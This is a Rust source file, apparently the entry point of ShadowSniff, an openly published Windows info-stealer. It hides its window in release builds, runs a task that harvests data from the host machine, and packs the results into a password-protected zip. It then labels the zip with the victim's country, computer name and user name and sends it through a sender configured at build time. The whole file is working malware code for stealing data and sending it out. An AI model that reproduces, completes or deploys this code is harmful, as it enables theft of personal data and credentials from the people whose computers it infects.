/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#![no_main]
#![no_std]
#![cfg_attr(debug_assertions, windows_subsystem = "console")]
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use crate::allocator::WinHeapAlloc;
use alloc::format;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::atomic::AtomicCollector;
use collector::display::PrimitiveDisplayCollector;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, FileSystemExt};
use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
use rand_chacha::ChaCha20Rng;
use rand_core::RngCore;
use filesystem::virtualfs::VirtualFileSystem;
use shadowsniff::SniffTask;
use tasks::Task;
use utils::log_debug;
use utils::pc_info::PcInfo;
use utils::random::ChaCha20RngExt;
use zip::ZipArchive;
use sender::LogSenderExt;

mod allocator;
mod panic;

#[global_allocator]
static ALLOC: WinHeapAlloc = WinHeapAlloc;

#[unsafe(no_mangle)]
#[cfg(not(feature = "builder_build"))]
pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
    if !init_ip_info() {
        panic!()
    }

    let fs = StorageFileSystem;
    let out = &Path::new("output");
    let _ = fs.remove_dir_all(out);
    let _ = fs.mkdir(out);

    let collector = AtomicCollector::default();

    SniffTask::default().run(out, &fs, &collector);

    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));

    log_debug!("{displayed_collector}");

    0
}

#[unsafe(no_mangle)]
#[cfg(feature = "builder_build")]
pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
    if !init_ip_info() {
        panic!()
    }

    let fs = VirtualFileSystem::default();
    let out = &Path::new("\\output");
    let _ = fs.mkdir(out);

    let collector = AtomicCollector::default();

    SniffTask::default().run(out, &fs, &collector);

    let password: String = {
        let charset: Vec<char> = "shadowsniff0123456789"
            .chars()
            .collect();
        let mut rng = ChaCha20Rng::from_nano_time();

        (0..15)
            .map(|_| {
                let idx = (rng.next_u32() as usize) % charset.len();
                charset[idx]
            })
            .collect()
    };

    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));

    let zip = ZipArchive::default()
        .add_folder_content(&fs, out)
        .password(password)
        .comment(displayed_collector);

    let sender = include!(env!("BUILDER_SENDER_EXPR"));

    let _ = sender.send_archive(generate_log_name(), zip, &collector);

    0
}

#[cfg(feature = "builder_build")]
fn generate_log_name() -> Arc<str> {
    let PcInfo {
        computer_name,
        user_name,
        ..
    } = PcInfo::retrieve();
    let IpInfo { country, .. } = unwrapped_ip_info();

    format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
}
